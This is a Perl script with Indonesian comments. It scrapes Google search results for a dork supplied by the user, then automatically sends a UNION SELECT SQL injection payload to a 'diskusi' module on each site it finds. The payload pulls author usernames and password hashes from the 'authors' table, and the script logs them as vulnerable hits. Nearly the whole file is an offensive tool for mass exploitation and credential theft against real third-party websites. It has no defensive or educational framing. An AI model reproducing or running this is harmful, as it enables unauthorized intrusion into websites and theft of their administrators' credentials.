#!/usr/bin/perl
#

use LWP::UserAgent;
use HTTP::Message;
use URI::Escape;


$baner=<<END
Google search lewat konsole...
:))

END
;
printlog($baner);

#$proxy = 'http://XXX.XXX.1.135:80/';
$log="google_endo.log";
$fsav="google_fsav_endo.txt";

$komponen=$ARGV[0];

$usage = "Usage: perl $0 <keyword> 
Example : perl $0 \".co.id/shopdisplaycategories.asp\" \n";
if($#ARGV<0) { die "$usage"; }

$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
$ua->proxy(http => $proxy) if defined($proxy);

$browser = LWP::UserAgent->new;
$browser -> agent("Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
$browser->proxy(http => $proxy) if defined($proxy);


$counter=0;
#Read last session
open(hf,$fsav);
$lastsav=<hf>;
close(hf);
$check=1;#Check if any save session

$nomer=1;
while(1)
{
sleep 1;
$gourl = "http://www.google.co.id/search?q=$komponen&sourceid=mozilla-search&start=0&start=$counter&ie=utf-8&oe=utf-8&client=firefox-a&rls=org.mozilla:en-US:official";
$grabresponse = $ua->get($gourl);
$counter=$counter+10;
if (!($grabresponse->is_success)) {
printlog ($grabresponse->status_line. "  Failure\n");
} else {

   my $kutukupret=join("",$grabresponse->as_string);

exit if ($kutukupret=~/Google does not serve more than 1000/); #End Google search or Stop
exit if ($kutukupret=~/did not match any documents./); #End Google search or Stop
exit if ($kutukupret=~/\<title\>403 Forbidden\<\/title\>/); #End Google search or Stop

while (1) {
 sleep 1;
 $cucok=$kutukupret=~m#<a class=l href="http://(.+?)"#sg;
 last if (!($cucok)); #End Google search for this page

 $url=$1;

  if (($lastsav ne "") && (!($lastsav =~ /$url/)) && $check)
  {
     next;
  } else
  {
     $check=0;
  }
  #Save Session
  open(hf,">$fsav");
  print hf $url;
  close(hf);
  
  printlog("$nomer. http://$url\t");
  $nomer++;

  $weleh=$url=~m/(.+?)\/(.+?\/){0,1}(.+?\/){0,1}/g;
  $urltarget="http://$1/$2$3mod.php?mod=diskusi&op=viewdisk&did=-4%20union%20select%200,0,name,0,pwd,0,0%20from%20authors/*";
  $urltarget=~s/ /%20/g;
  print "\nProcessing $urltarget.....\n";

###
&melihat($urltarget);

printlog("\n");

} #end of while 1

} #end of if

} #end of while 2


sub printlog {
print @_[0];
open(lo,">>$log");
print lo @_[0];
close(lo);
return;
}

sub melihat {
my $target = shift;
my $lihat = HTTP::Request->new(GET => $target );

my $lihatresponse = $ua->request($lihat);
  if ($lihatresponse->is_success) {
  $cucok1=$lihatresponse->as_string=~m/itemlink\"\>\<b\>(.+)\<\/b\>/g;
  if($cucok1) { printlog("[~] VULNER***************** Username = $1\t"); }
  $cucok2=$lihatresponse->as_string=~m/uname\=([a-zA-Z0-9]{32})\"/g;
  if($cucok2) { printlog("[~] MD5 = $1\n"); }
 } else { 
   print "Error: ". $lihatresponse->status_line."\n\n";
  } #of else
} ### of sub